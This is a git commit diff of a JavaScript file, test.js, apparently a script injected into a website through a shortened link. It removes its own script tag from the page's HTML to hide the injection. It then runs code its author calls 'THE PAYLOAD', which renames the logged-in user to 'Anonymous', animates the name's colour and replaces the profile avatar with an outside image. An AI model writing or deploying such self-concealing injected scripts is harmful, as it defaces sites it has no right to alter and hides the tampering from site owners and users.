8ccff1584e33ba08c537cef2061e5f992d2c627c
theultraman20 <32559038+theultraman20@users.noreply.github.com>
2018-03-06 23:55:21 -0500

    Update test.js

--- test.js
+++ test.js
@@ -1,5 +1,3 @@
-alert("Your up to date!");
-
 //var script = document.querySelector("script[src='//goo.gl/PHPvuT']")
 
 var script = document.currentScript;
@@ -9,3 +7,24 @@ var oldHtml = document.body.innerHTML;
 var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src=\"//goo.gl/PHPvuT\">"));//the first argument of slice is the start position (index 0), but the second is how MANY characters
 
 document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + "<script src=\"//goo.gl/PHPvuT\">".length )
+
+//FIXES THE WHOLE DAMN SITE! WORKS LIKE A CHARM! Now HERES THE FUN PART!!! THE PAYLOAD!!!
+
+var userName = document.querySelector(".welcome-user-name")
+
+userName.innerText = "Anonymous"
+
+var i = 0;
+
+setInterval(function(){
+  userName.style.color = ("hsl(" + i%361 + ", 75%, 50%)")
+  i++;
+}, 12);
+
+var avater = document.querySelector(".profile-avatar-picture")
+
+if (avater) {
+  avater.firstChild.style.width = "100%"
+  avater.firstChild.style.height = "100%"
+  avater.firstChild.src = "http://webiconspng.com/wp-content/uploads/2017/09/Anonymous-Mask-PNG-Image-87272.png"
+};
